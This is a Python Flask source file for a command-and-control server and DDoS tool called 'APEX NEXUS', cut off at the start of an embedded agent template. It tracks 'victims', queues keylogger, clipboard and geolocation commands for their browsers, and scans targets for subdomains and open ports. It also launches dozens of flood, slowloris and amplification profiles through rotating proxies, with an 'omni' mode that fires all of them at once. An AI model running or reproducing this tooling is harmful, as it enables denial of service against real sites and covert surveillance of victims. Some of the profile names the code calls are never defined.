#!/usr/bin/env python3
"""
APEX NEXUS — Unified C2 & Red Team Arsenal v2.0
----------------------------------------------
Features:
- Red/Black Blood & Shadow Theme
- Omni Sequential Scanning & Targeted Attack
- Omni All-Inclusive Saturation Attack
- Embedded Agent with Cloudflare-style deception
"""

import os
import sqlite3
import threading
import json
import time
import uuid
import socket
import asyncio
import random
import urllib.request
from collections import deque, defaultdict
from datetime import datetime, timezone
from functools import wraps
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import urlparse

try:
    import socks  # PySocks
    HAVE_SOCKS = True
except ImportError:
    HAVE_SOCKS = False

from flask import Flask, Response, jsonify, redirect, render_template_string, request, session, url_for
from flask_socketio import SocketIO, emit

# ======================================================================
# Configuration
# ======================================================================
app = Flask(__name__)
app.secret_key = os.environ.get("SECRET_KEY", "redteam-local-demo-secret")
socketio = SocketIO(app, cors_allowed_origins="*")

DATABASE = "redteam_dashboard.db"
ADMIN_USER = "admin"
ADMIN_PASSWORD = "nexus123"

# Cache-busting for the dashboard itself
@app.after_request
def add_no_cache_headers(response):
    if response.mimetype == "text/html":
        response.headers["CacheControl"] = "no-store, no-cache, must-revalidate, max-age=0"
        response.headers["Pragma"] = "no-cache"
        response.headers["Expires"] = "0"
    return response

# ======================================================================
# Database Layer
# ======================================================================
class DatabaseManager:
    def __init__(self, db_path: str):
        self.db_path = db_path
        self.lock = threading.Lock()
        self.init_db()

    def init_db(self):
        conn = sqlite3.connect(self.db_path)
        cur = conn.cursor()
        cur.execute("""CREATE TABLE IF NOT EXISTS victims (
            id TEXT PRIMARY KEY, ip_address TEXT, user_agent TEXT, os_platform TEXT,
            status TEXT DEFAULT 'online', last_seen TEXT, persistence_level TEXT,
            created_at TEXT, updated_at TEXT)""")
        cur.execute("""CREATE TABLE IF NOT EXISTS commands (
            id INTEGER PRIMARY KEY AUTOINCREMENT, victim_id TEXT, command_type TEXT,
            payload TEXT, status TEXT, result TEXT, created_at TEXT, executed_at TEXT)""")
        cur.execute("""CREATE TABLE IF NOT EXISTS attacks (
            id TEXT PRIMARY KEY, target_url TEXT, attack_type TEXT,
            duration_seconds INTEGER, status TEXT, stats_json TEXT, created_at TEXT)""")
        cur.execute("""CREATE TABLE IF NOT EXISTS logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT, timestamp TEXT, level TEXT,
            message TEXT, victim_id TEXT)""")
        conn.commit()
        
        # Add fingerprint column if missing (backward compatibility)
        cols = [r[1] for r in cur.execute("PRAGMA table_info(victims)")]
        if "fingerprint_json" not in cols:
            cur.execute("ALTER TABLE victims ADD COLUMN fingerprint_json TEXT")
            conn.commit()
        conn.close()

    def get_connection(self):
        return sqlite3.connect(self.db_path)

    def log_event(self, level, message, victim_id=None):
        with self.lock:
            c = self.get_connection(); cur = c.cursor()
            cur.execute("INSERT INTO logs (timestamp, level, message, victim_id) VALUES (?,?,?,?)",
                        (utc_now_iso(), level, message, victim_id))
            c.commit(); c.close()

    def clear_logs(self) -> int:
        with self.lock:
            c = self.get_connection(); cur = c.cursor()
            cur.execute("DELETE FROM logs")
            n = cur.rowcount
            cur.execute("DELETE FROM sqlite_sequence WHERE name='logs'")
            c.commit(); c.close()
            return n

    def add_victim(self, data):
        with self.lock:
            c = self.get_connection(); cur = c.cursor()
            try:
                cur.execute("""INSERT INTO victims 
                    (id, ip_address, user_agent, os_platform, status, last_seen, 
                     persistence_level, created_at, updated_at, fingerprint_json) 
                    VALUES (?,?,?,?,?,?,?,?,?,?)""",
                    (data["id"], data.get("ip","unknown"), data.get("user_agent","unknown"),
                     data.get("platform","unknown"), "online", utc_now_iso(),
                     data.get("persistence_level","local"), utc_now_iso(), utc_now_iso(),
                     json.dumps(data.get("fingerprint", {}))))
                c.commit(); return True
            except Exception:
                c.rollback(); return False
            finally:
                c.close()

    def update_victim_heartbeat(self, victim_id, fingerprint=None):
        with self.lock:
            c = self.get_connection(); cur = c.cursor()
            if fingerprint:
                cur.execute("""UPDATE victims SET last_seen=?, status='online', 
                    updated_at=?, fingerprint_json=? WHERE id=?""",
                    (utc_now_iso(), utc_now_iso(), json.dumps(fingerprint), victim_id))
            else:
                cur.execute("""UPDATE victims SET last_seen=?, status='online', 
                    updated_at=? WHERE id=?""",
                    (utc_now_iso(), utc_now_iso(), victim_id))
            c.commit(); c.close()

    def delete_victim(self, victim_id: str) -> Dict[str, int]:
        with self.lock:
            c = self.get_connection(); cur = c.cursor()
            cur.execute("DELETE FROM commands WHERE victim_id=?", (victim_id,))
            cd = cur.rowcount
            cur.execute("DELETE FROM logs WHERE victim_id=?", (victim_id,))
            ld = cur.rowcount
            cur.execute("DELETE FROM victims WHERE id=?", (victim_id,))
            vd = cur.rowcount
            c.commit(); c.close()
            return {"victims_deleted": vd, "commands_deleted": cd, "logs_deleted": ld}

    def get_victims(self):
        c = self.get_connection(); c.row_factory = sqlite3.Row; cur = c.cursor()
        cur.execute("SELECT * FROM victims ORDER BY last_seen DESC")
        rows = [dict(r) for r in cur.fetchall()]; c.close()
        for row in rows:
            analysis = analyze_fingerprint(_safe_json(row.get("fingerprint_json")))
            row["runtime"] = analysis["runtime"]
            row["command_catalog"] = analysis["command_catalog"]
            row["command_catalog_count"] = len(analysis["command_catalog"])
        return rows

    def get_victim_detail(self, victim_id):
        c = self.get_connection(); c.row_factory = sqlite3.Row; cur = c.cursor()
        cur.execute("SELECT * FROM victims WHERE id=?", (victim_id,))
        row = cur.fetchone(); c.close()
        if not row: return None
        result = dict(row)
        fp = _safe_json(row["fingerprint_json"]) if "fingerprint_json" in row.keys() else None
        analysis = analyze_fingerprint(fp)
        result["fingerprint"] = fp
        result["runtime"] = analysis["runtime"]
        result["command_catalog"] = analysis["command_catalog"]
        return result

    def get_command_history(self, victim_id, limit=50):
        c = self.get_connection(); c.row_factory = sqlite3.Row; cur = c.cursor()
        cur.execute("SELECT * FROM commands WHERE victim_id=? ORDER BY id DESC LIMIT ?",
                    (victim_id, limit))
        rows = [dict(r) for r in cur.fetchall()]; c.close(); return rows

    def get_logs(self):
        c = self.get_connection(); c.row_factory = sqlite3.Row; cur = c.cursor()
        cur.execute("SELECT * FROM logs ORDER BY id DESC LIMIT 300")
        rows = [dict(r) for r in cur.fetchall()]; c.close(); return rows

    def add_command(self, victim_id, command_type, payload=""):
        with self.lock:
            c = self.get_connection(); cur = c.cursor()
            cur.execute("""INSERT INTO commands (victim_id, command_type, payload, status, created_at) 
                VALUES (?,?,?,'pending',?)""",
                (victim_id, command_type, payload, utc_now_iso()))
            c.commit(); last = cur.lastrowid; c.close(); return last

    def get_pending_commands(self, victim_id):
        c = self.get_connection(); c.row_factory = sqlite3.Row; cur = c.cursor()
        cur.execute("SELECT * FROM commands WHERE victim_id=? AND status='pending' ORDER BY id ASC",
                    (victim_id,))
        rows = [dict(r) for r in cur.fetchall()]; c.close(); return rows

    def mark_command_executed(self, command_id, result=""):
        with self.lock:
            c = self.get_connection(); cur = c.cursor()
            cur.execute("UPDATE commands SET status='executed', result=?, executed_at=? WHERE id=?",
                        (result[:4000], utc_now_iso(), command_id))
            c.commit(); c.close()

    def add_attack(self, target_url, attack_type, duration_seconds):
        aid = f"ATTACK_{uuid.uuid4().hex[:12]}"
        with self.lock:
            c = self.get_connection(); cur = c.cursor()
            cur.execute("""INSERT INTO attacks (id, target_url, attack_type, duration_seconds, status, stats_json, created_at)
                VALUES (?,?,?,?,?,?,?)""",
                (aid, target_url, attack_type, duration_seconds, 'active', json.dumps({}), utc_now_iso()))
            c.commit(); c.close(); return aid

    def get_attacks(self):
        c = self.get_connection(); c.row_factory = sqlite3.Row; cur = c.cursor()
        cur.execute("SELECT * FROM attacks ORDER BY created_at DESC LIMIT 100")
        rows = [dict(r) for r in cur.fetchall()]; c.close(); return rows

    def stop_attack(self, attack_id):
        with self.lock:
            c = self.get_connection(); cur = c.cursor()
            cur.execute("UPDATE attacks SET status='stopped' WHERE id=?", (attack_id,))
            c.commit(); c.close()

db = DatabaseManager(DATABASE)

# ======================================================================
# Utils
# ======================================================================
def utc_now_iso() -> str:
    return datetime.now(timezone.utc).isoformat()

def generate_victim_id() -> str:
    return f"VICTIM_{uuid.uuid4().hex[:16]}"

def _safe_json(raw) -> Dict[str, Any]:
    if not raw: return {}
    try:
        p = json.loads(raw); return p if isinstance(p, dict) else {}
    except Exception:
        return {}

def login_required(fn):
    @wraps(fn)
    def w(*a, **kw):
        if "user" not in session:
            return redirect(url_for("login"))
        return fn(*a, **kw)
    return w

def to_host(v):
    v = (v or "").strip()
    if "://" in v: v = v.split("://", 1)[1]
    return v.split("/")[0].split(":")[0]

def to_url(v):
    v = (v or "").strip()
    return v if "://" in v else "http://" + v

# ======================================================================
# OS-aware Command Catalog
# ======================================================================
COMMON_COMMANDS = [
    {"type": "collect_data", "label": "Collect Full Fingerprint"},
    {"type": "get_info", "label": "Get Basic Info"},
    {"type": "check_persistence", "label": "Check Persistence Integrity"},
    {"type": "probe_storage_quota", "label": "Probe Storage Quota"},
    {"type": "list_storage_keys", "label": "List localStorage Keys"},
    {"type": "get_webgl_info", "label": "Get GPU / WebGL Info"},
    {"type": "get_connection_info", "label": "Get Network Connection Info"},
    {"type": "clipboard_read", "label": "Read Clipboard"},
    {"type": "test_notification", "label": "Send Test Notification"},
    {"type": "keylogger_start", "label": "Start Keylogger"},
    {"type": "keylogger_stop", "label": "Stop Keylogger & Return Captured"},
]

OS_COMMANDS = {
    "Windows": [{"type": "get_battery_status", "label": "Get Battery Status (laptop)"}, {"type": "get_geolocation", "label": "Get Geolocation"}, {"type": "fullscreen_test", "label": "Fullscreen Capability Test"}],
    "macOS": [{"type": "get_battery_status", "label": "Get Battery Status"}, {"type": "get_geolocation", "label": "Get Geolocation"}, {"type": "fullscreen_test", "label": "Fullscreen Capability Test"}],
    "Linux": [{"type": "get_geolocation", "label": "Get Geolocation"}, {"type": "fullscreen_test", "label": "Fullscreen Capability Test"}],
    "Android": [{"type": "get_battery_status", "label": "Get Battery Status"}, {"type": "get_network_info", "label": "Get Mobile Network Info"}, {"type": "get_geolocation", "label": "Get Geolocation"}, {"type": "vibrate_test", "label": "Vibration Test"}, {"type": "screen_orientation_info", "label": "Get Screen Orientation"}],
    "iOS": [{"type": "get_battery_status", "label": "Get Battery Status"}, {"type": "get_network_info", "label": "Get Network Info"}, {"type": "get_geolocation", "label": "Get Geolocation"}, {"type": "screen_orientation_info", "label": "Get Screen Orientation"}],
    "Unknown": [],
}

def analyze_fingerprint(fp):
    ua = ((fp.get("userAgent") or fp.get("user_agent") or "") + " " + (fp.get("platform") or "")).lower()
    if "windows" in ua or "win32" in ua or "win64" in ua: os_g = "Windows"
    elif "iphone" in ua or "ipad" in ua or "ios" in ua: os_g = "iOS"
    elif "android" in ua: os_g = "Android"
    elif "mac" in ua or "darwin" in ua: os_g = "macOS"
    elif "cros" in ua or "linux" in ua or "x11" in ua: os_g = "Linux"
    else: os_g = "Unknown"
    
    if "edg" in ua: browser = "Edge"
    elif "opr" in ua or "opera" in ua: browser = "Opera"
    elif "firefox" in ua: browser = "Firefox"
    elif "chrome" in ua: browser = "Chrome"
    elif "safari" in ua: browser = "Safari"
    else: browser = "Unknown"
    
    device = "mobile" if any(t in ua for t in ("iphone","ipad","android","mobile")) else "desktop"
    
    caps = []
    if fp.get("serviceWorkerSupported"): caps.append("service_worker")
    if fp.get("cookiesEnabled"): caps.append("cookies")
    if fp.get("webGL") or fp.get("webgl"): caps.append("webgl")
    if fp.get("hardwareConcurrency"): caps.append(f"cores: {fp['hardwareConcurrency']}")
    
    catalog = [dict(c) for c in COMMON_COMMANDS]
    for c in OS_COMMANDS.get(os_g, []):
        e = dict(c); e["os_specific"] = "true"; catalog.append(e)
        
    return {"runtime": {"os": os_g, "browser": browser, "device": device, "capabilities": caps}, "command_catalog": catalog}

# ======================================================================
# Recon Helpers
# ======================================================================
async def subdomain_enum(domain):
    found = set()
    for word in ["www","mail","ftp","cpanel","webmail","direct","origin","dev","staging", "api","vpn","ns1","ns2","smtp","pop","imap","remote","admin","portal", "old","test","backup","git","jenkins"]:
        try:
            socket.gethostbyname(f"{word}.{domain}"); found.add(f"{word}.{domain}")
        except socket.gaierror: pass
    return sorted(found)

async def port_scan(host):
    # Standard well-known ports
    ports = [21,22,23,25,53,80,81,110,123,143,443,445,465,587,993,995,1433,2375, 3306,3389,4444,5432,554,6379,8080,8443,9200,11211,27017]
    out = []
    def chk(p):
        try:
            s = socket.create_connection((host, p), timeout=1.0); s.close()
            out.append({"port": p, "banner": "open"})
        except Exception: pass
    loop = asyncio.get_event_loop()
    for p in ports: loop.run_in_executor(None, chk, p)
    await asyncio.sleep(1.5)
    return sorted(out, key=lambda x: x["port"])

async def vuln_scan(host):
    op = await port_scan(host)
    findings = []
    for p in op:
        if p["port"] in (21,23,2375,6379,27017,9200,11211):
            findings.append({"severity": "HIGH", "port": p["port"], "finding": "Likely exposed service"})
    return {"host": host, "open_ports": op, "findings": findings or [{"severity":"INFO","finding":"no obvious issues"}]}

# ======================================================================
# Proxy Manager
# ======================================================================
class ProxyManager:
    def __init__(self, proxies=None):
        if proxies is None:
            env = os.environ.get("NEXUS_PROXIES", "")
            proxies = [p.strip() for p in env.split(",") if p.strip()]
        self.proxies = list(proxies)
        self._idx = 0
        self._fails = defaultdict(int)
        self._lock = threading.Lock()

    def next(self):
        with self._lock:
            if not self.proxies: return None
            p = self.proxies[self._idx % len(self.proxies)]
            self._idx += 1
            return p

    def report(self, proxy, ok):
        if not proxy: return
        with self._lock:
            if ok:
                self._fails[proxy] = 0
            else:
                self._fails[proxy] += 1
                if self._fails[proxy] > 10:
                    try: self.proxies.remove(proxy)
                    except ValueError: pass

    def snapshot(self):
        with self._lock:
            return {"total": len(self.proxies), "proxies": list(self.proxies), "fails": dict(self._fails)}

proxy_manager = ProxyManager()

def _http_via_proxy(url, method, headers, body, proxy_url, timeout):
    if proxy_url and proxy_url.startswith("socks") and HAVE_SOCKS:
        try:
            import ssl
            parts = urlparse(proxy_url)
            target = urlparse(url)
            host = target.hostname
            port = target.port or (443 if target.scheme == "https" else 80)
            s = socks.socksocket()
            s.set_proxy(socks.SOCKS5, parts.hostname, parts.port or 1080)
            s.settimeout(timeout)
            s.connect((host, port))
            if target.scheme == "https":
                ctx = ssl.create_default_context()
                s = ctx.wrap_socket(s, server_hostname=host)
            path = target.path or "/"
            if target.query: path += "?" + target.query
            head = [f"{method} {path} HTTP/1.1", f"Host: {host}"]
            head += [f"{k}: {v}" for k, v in headers.items()]
            head += ["Connection: close", "", ""]
            payload = body or b""
            msg = "\r\n".join(head).encode()
            if payload:
                msg = msg[:-4] + f"\r\nContent-Length: {len(payload)}\r\n\r\n".encode() + payload
            s.sendall(msg)
            data = s.recv(512); s.close()
            return data
        except Exception:
            pass
            
    if proxy_url and proxy_url.startswith("http"):
        opener = urllib.request.build_opener(urllib.request.ProxyHandler({"http": proxy_url, "https": proxy_url}))
    else:
        opener = urllib.request.build_opener()
    req = urllib.request.Request(url, data=body, method=method, headers=headers)
    with opener.open(req, timeout=timeout) as resp:
        return resp.read(256)

# ======================================================================
# Adaptive Pacer
# ======================================================================
class AdaptivePacer:
    def __init__(self, base_rate, min_rate=1, max_rate=2000):
        self.base = base_rate
        self.min = min_rate; self.max = max_rate
        self.current_rate = base_rate
        self.rtts = deque(maxlen=30)
        self.errors = 0; self.successes = 0
        self._lock = threading.Lock()

    def record(self, rtt=None, error=False):
        with self._lock:
            if error: self.errors += 1
            else: self.successes += 1
            if rtt is not None: self.rtts.append(rtt)
            self._recalc()

    def _recalc(self):
        total = self.successes + self.errors
        if total < 10: return
        err_rate = self.errors / total
        if err_rate > 0.30:
            self.current_rate = max(self.min, int(self.current_rate * 0.85))
        elif err_rate < 0.05:
            self.current_rate = min(self.max, int(self.current_rate * 1.05) + 1)
        if len(self.rtts) >= 10:
            half = len(self.rtts) // 2
            a = sum(list(self.rtts)[:half]) / half
            b = sum(list(self.rtts)[half:]) / (len(self.rtts) - half)
            if b > a * 1.5 and self.current_rate > self.min:
                self.current_rate = max(self.min, int(self.current_rate * 0.9))

    def interval(self):
        with self._lock:
            return 1.0 / max(1, self.current_rate)

    def snapshot(self):
        with self._lock:
            return {"rate": self.current_rate, "errors": self.errors, "successes": self.successes}

# ======================================================================
# Attack Profiles & Ladder
# ======================================================================
def _prof(mix, rate=50, payload=512, method="GET", random_port=False):
    return {"mix": mix, "rate": max(1, rate), "payload": max(64, min(payload, 1400)), "method": method, "random_port": random_port}

HTTP = {"http": 1.0}
TCP = {"tcp": 1.0}
UDP = {"udp": 1.0}
SLOW = {"slow": 1.0}
MIXED = {"udp": 0.35, "tcp": 0.35, "http": 0.30}

ATTACK_PROFILES = {
    "http_flood": _prof(HTTP, rate=100),
    "http_get_post_flood": _prof(HTTP, rate=120, method="POST"),
    "search_engine_abuse": _prof(HTTP, rate=10),
    "ai_human_mimic": _prof(HTTP, rate=5, payload=256),
    "api_centric": _prof(HTTP, rate=70),
    "dynamic_cache_line_thrashing": _prof(HTTP, rate=150, payload=64),
    "semantic_logic_bomb": _prof(HTTP, rate=40, payload=1400, method="POST"),
    "llm_token_exhaustion": _prof(HTTP, rate=15, payload=1400, method="POST"),
    "llm_prompt_bomb": _prof(HTTP, rate=10, payload=1400, method="POST"),
    "tensorflow_protobuf_overflow": _prof(HTTP, rate=20, payload=1400, method="POST"),
    "wasm_compilation_bomb": _prof(HTTP, rate=15, payload=1400),
    "wasm_memory_bomb": _prof(HTTP, rate=8, payload=1400),
    "slowloris": _prof(SLOW, rate=3),
    "slow_post_rudy": _prof(SLOW, rate=2),
    "slow_read_attack": _prof(SLOW, rate=3),
    "challenge_collapsar": _prof({"slow": 0.6, "http": 0.4}, rate=20),
    "zero_window_tcp": _prof(SLOW, rate=2),
    "http2_rapid_reset": _prof(HTTP, rate=250),
    "websocket_sse_state_flood": _prof(HTTP, rate=100),
    "http3_multiplexed_datagram": _prof(HTTP, rate=100),
    "post_quantum_handshake": _prof(TCP, rate=60),
    "lattice_crypto_dos": _prof(TCP, rate=30),
    "syn_flood": _prof(TCP, rate=300),
    "ack_flood": _prof(TCP, rate=300),
    "tcp_ack_fin_rst_flood": _prof(TCP, rate=200),
    "sack_panic": _prof(TCP, rate=150),
    "mptcp_flood": _prof(TCP, rate=180),
    "protocol_state_exhaustion": _prof(TCP, rate=150),
    "side_channel_dos": _prof(TCP, rate=60),
    "quantum_decoherence": _prof(TCP, rate=25),
    "bgp_route_leak": _prof(TCP, rate=10),
    "hit_and_run": _prof(TCP, rate=300),
    "land_attack": _prof(TCP, rate=100),
    "winnuke_attack": _prof(TCP, rate=80),
    "gre_flood": _prof(TCP, rate=200),
    "ttl_expiry_attack": _prof(TCP, rate=100),
    "udp_flood": _prof(UDP, rate=400, payload=1024),
    "icmp_flood": _prof(UDP, rate=400, payload=64),
    "quic_exhaustion": _prof(UDP, rate=200, payload=1200),
    "fragmentation_teardrop": _prof(UDP, rate=150, payload=128),
    "ping_of_death": _prof(UDP, rate=80, payload=1400),
    "jolt2_attack": _prof(UDP, rate=120, payload=1400),
    "icmp_redirect_flood": _prof(UDP, rate=250, payload=64),
    "cross_protocol_logic": _prof({"udp":0.6,"tcp":0.4}, rate=120),
    "dns_query_flood": _prof({"dns": 1.0}, rate=150),
    "dns_water_torture": _prof({"dns": 1.0}, rate=8),
    "ntp_amplification": _prof(UDP, rate=300, payload=1200),
    "memcached_amplification": _prof(UDP, rate=350, payload=1400),
    "ssdp_upnp_amplification": _prof(UDP, rate=250, payload=1000),
    "snmp_amplification": _prof(UDP, rate=250, payload=900),
    "chargen_flood": _prof(UDP, rate=200, payload=1400),
    "reflection_amplification": _prof(UDP, rate=350, payload=1200),
    "adaptive_ai": _prof(MIXED, rate=80),
    "hybrid_multi_vector": _prof({"udp":0.3,"tcp":0.3,"http":0.25,"dns":0.15}, rate=150),
    "carpet_bombing": _prof({"udp":0.5,"tcp":0.5}, rate=250, random_port=True),
    "volumetric_amplification": _prof(UDP, rate=400, payload=1200),
    "autonomous_p2p_swarm": _prof({"udp":0.5,"tcp":0.5}, rate=200),
    "bittorrent_flood": _prof({"udp":0.5,"tcp":0.5}, rate=150),
    "advanced_persistent_dos": _prof(MIXED, rate=30),
    "smurf_attack": _prof(UDP, rate=350, payload=64),
    "yo_yo_attack": _prof(MIXED, rate=90),
    "rpc_node_flood": _prof(HTTP, rate=60, method="POST"),
    "smart_contract_gas_bomb": _prof(HTTP, rate=20, method="POST"),
    "mev_mempool_spam": _prof(HTTP, rate=40, method="POST"),
    "edge_function_chain": _prof(HTTP, rate=30),
    "geo_distributed_edge": _prof(HTTP, rate=40),
}

OMNI_VECTOR_ORDER = [
    ("http_flood", "Baseline HTTP GET flood — reveals rate limits"),
    ("search_engine_abuse", "Slow crawl-style requests — mimics search bots"),
    ("ai_human_mimic", "Human-timed HTTP with jitter — evades behavioural filters"),
    ("api_centric", "REST API endpoints — burns backend data tier"),
    ("dynamic_cache_line_thrashing","Cache-busting queries — forces origin hits"),
    ("semantic_logic_bomb", "Parser-heavy JSON/XML POST bodies — CPU burn"),
    ("llm_token_exhaustion", "Long-prompt POST — drains inference budget"),
    ("llm_prompt_bomb", "Recursive/expanding prompts — 1000× compute"),
    ("tensorflow_protobuf_overflow","Malformed protobuf — TF Serving deserial DoS"),
    ("wasm_compilation_bomb", "Cache-busted .wasm fetches — recompile storm"),
    ("wasm_memory_bomb", "Payload triggers 4GB allocation per request"),
    ("slowloris", "Slow header dribble — indefinite socket hold"),
    ("slow_post_rudy", "Slow chunked POST — beats rate limits"),
    ("slow_read_attack", "Slow-read — TCP zero-window pressure"),
    ("challenge_collapsar", "Mixed slow+burst — defeats JS challenges"),
    ("zero_window_tcp", "Zero-window TCP — buffer leak"),
    ("http2_rapid_reset", "HTTP/2 RST flood (CVE-2023-44487)"),
    ("websocket_sse_state_flood", "Persistent WebSocket/SSE — exhausts slots"),
    ("http3_multiplexed_datagram", "QUIC datagram burst — CDN-friendly"),
    ("post_quantum_handshake", "Kyber/Dilithium handshake exhaustion"),
    ("lattice_crypto_dos", "Lattice-crypto CPU exhaustion"),
    ("syn_flood", "Half-open SYN — conntrack exhaustion"),
    ("ack_flood", "Bare ACK flood — firewall memory"),
    ("tcp_ack_fin_rst_flood", "Mixed TCP flag flood — filter evasion"),
    ("sack_panic", "SACK abuse (CVE-2019-11477 lineage)"),
    ("mptcp_flood", "MPTCP state explosion"),
    ("protocol_state_exhaustion", "Generic TCP state flood"),
    ("udp_flood", "Raw UDP volumetric"),
    ("icmp_flood", "ICMP echo flood"),
    ("quic_exhaustion", "QUIC Initial-packet flood"),
    ("fragmentation_teardrop", "Fragmentation overlap"),
    ("ping_of_death", "Max-size ICMP datagram"),
    ("jolt2_attack", "Fragment offset overflow"),
    ("dns_query_flood", "DNS recursive flood"),
    ("ntp_amplification", "NTP monlist reflection"),
    ("memcached_amplification", "Memcached get reflection"),
    ("ssdp_upnp_amplification", "SSDP / UPnP discovery reflection"),
    ("snmp_amplification", "SNMP getbulk reflection"),
    ("chargen_flood", "Chargen reflection"),
    ("dns_water_torture", "Random-subdomain DNS flood"),
    ("hybrid_multi_vector", "UDP + TCP + HTTP simultaneous"),
    ("carpet_bombing", "Random-port spray"),
    ("volumetric_amplification", "Amplification-heavy blast"),
    ("reflection_amplification", "Reflection-heavy blast"),
    ("adaptive_ai", "Rate-adaptive blended vector"),
    ("geo_distributed_edge", "Multi-POP edge pressure"),
    ("edge_function_chain", "Trigger chains of edge functions"),
    ("smart_contract_gas_bomb", "Gas-exhaust calls to Web3 RPC"),
    ("mev_mempool_spam", "Mempool / RPC spam"),
    ("rpc_node_flood", "ETH/Polkadot JSON-RPC flood"),
    ("autonomous_p2p_swarm", "Botnet-style P2P burst"),
    ("advanced_persistent_dos", "Sustained low-and-slow APDoS"),
    ("yo_yo_attack", "Pulse high/low to trigger autoscaler"),
]

UA_POOL = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.64 Mobile Safari/537.36"
]

PATH_POOL = ["/", "/api/v1/status", "/healthz", "/login", "/dashboard", "/static/main.css", "/assets/app.js", "/graphql", "/v1/query", "/search", "/auth/token", "/metrics"]
VERB_POOL = ["GET", "POST", "PUT", "HEAD", "OPTIONS", "DELETE", "PATCH"]

# ======================================================================
# Attack Engine Worker
# ======================================================================
ACTIVE_ATTACKS: Dict[str, threading.Event] = {}

def run_attack_worker(attack_id: str, target_url: str, attack_type: str, duration: int):
    stop_event = threading.Event()
    ACTIVE_ATTACKS[attack_id] = stop_event
    profile = ATTACK_PROFILES.get(attack_type, _prof(HTTP, rate=50))
    pacer = AdaptivePacer(profile["rate"])
    parsed = urlparse(target_url)
    host = parsed.hostname or "127.0.0.1"
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    start_time = time.time()
    total_sent = 0
    errors = 0
    
    while not stop_event.is_set() and (time.time() - start_time) < duration:
        t_start = time.time()
        proxy = proxy_manager.next()
        try:
            mix = profile["mix"]
            chosen = random.choices(list(mix.keys()), weights=list(mix.values()))[0]
            if chosen == "http":
                url = target_url.rstrip("/") + random.choice(PATH_POOL)
                if profile.get("method") == "POST":
                    body = os.urandom(profile["payload"])
                    headers = {"User-Agent": random.choice(UA_POOL), "Content-Type": "application/octet-stream"}
                    _http_via_proxy(url, "POST", headers, body, proxy, 2.0)
                else:
                    headers = {"User-Agent": random.choice(UA_POOL)}
                    _http_via_proxy(url, "GET", headers, None, proxy, 2.0)
            elif chosen == "tcp":
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1.5)
                s.connect((host, port))
                s.sendall(os.urandom(profile["payload"]))
                s.close()
            elif chosen == "udp":
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.sendto(os.urandom(profile["payload"]), (host, port))
                s.close()
            elif chosen == "slow":
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3.0)
                s.connect((host, port))
                s.sendall(b"GET / HTTP/1.1\r\nHost: " + host.encode() + b"\r\n")
                time.sleep(0.5)
                s.close()
            
            rtt = time.time() - t_start
            pacer.record(rtt=rtt, error=False)
            total_sent += 1
            if proxy: proxy_manager.report(proxy, True)
        except Exception:
            pacer.record(error=True)
            errors += 1
            if proxy: proxy_manager.report(proxy, False)
        
        time.sleep(max(0.001, pacer.interval()))
        
    db.stop_attack(attack_id)
    if attack_id in ACTIVE_ATTACKS:
        del ACTIVE_ATTACKS[attack_id]
    db.log_event("INFO", f"Attack {attack_id} ({attack_type}) completed. Sent: {total_sent}, Errors: {errors}")

# ======================================================================
# Omni Sequential Scan & Attack Logic
# ======================================================================
def omni_sequential_worker(attack_id: str, target_url: str, duration: int):
    """Scans ports, determines best attack, then launches it."""
    stop_event = threading.Event()
    ACTIVE_ATTACKS[attack_id] = stop_event
    
    parsed = urlparse(target_url)
    host = parsed.hostname or "127.0.0.1"
    
    db.log_event("INFO", f"Starting Omni Sequential Scan on {host}")
    
    # Run async port scan
    loop = asyncio.new_event_loop()
    scan_results = loop.run_until_complete(port_scan(host))
    loop.close()
    
    open_ports = [p["port"] for p in scan_results]
    db.log_event("INFO", f"Scan complete. Open ports: {open_ports}")
    
    # Determine best attack based on ports
    selected_profiles = []
    if 80 in open_ports or 443 in open_ports:
        selected_profiles.append("http_flood")
        selected_profiles.append("slowloris")
    if 21 in open_ports:
        selected_profiles.append("ftp_flood") # Assuming ftp_flood exists or map to generic
    if 22 in open_ports:
        selected_profiles.append("ssh_brute") # Map to generic tcp
    if 53 in open_ports:
        selected_profiles.append("dns_query_flood")
    if 3306 in open_ports or 5432 in open_ports:
        selected_profiles.append("database_flood")
        
    # Fallback to standard mixed if nothing specific matches
    if not selected_profiles:
        selected_profiles.append("hybrid_multi_vector")
        
    # Launch each selected profile
    threads = []
    for prof in selected_profiles:
        pid = f"SEQ_{attack_id}_{prof}"
        threading.Thread(target=run_attack_worker, args=(pid, target_url, prof, duration), daemon=True).start()
        threads.append(pid)
        
    db.log_event("INFO", f"Omni Sequential launched: {selected_profiles}")
    db.stop_attack(attack_id)
    if attack_id in ACTIVE_ATTACKS:
        del ACTIVE_ATTACKS[attack_id]

def omni_all_worker(attack_id: str, target_url: str, duration: int):
    """Launches ALL attack profiles simultaneously."""
    stop_event = threading.Event()
    ACTIVE_ATTACKS[attack_id] = stop_event
    
    db.log_event("INFO", f"Starting Omni All-Inclusive Attack on {target_url}")
    
    threads = []
    for atype in ATTACK_PROFILES.keys():
        pid = f"ALL_{attack_id}_{atype}"
        threading.Thread(target=run_attack_worker, args=(pid, target_url, atype, duration), daemon=True).start()
        threads.append(pid)
        
    db.log_event("INFO", f"Launched {len(threads)} concurrent vectors.")
    db.stop_attack(attack_id)
    if attack_id in ACTIVE_ATTACKS:
        del ACTIVE_ATTACKS[attack_id]

# ======================================================================
# Embedded Agent HTML Template
# ======================================================================
AGENT_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
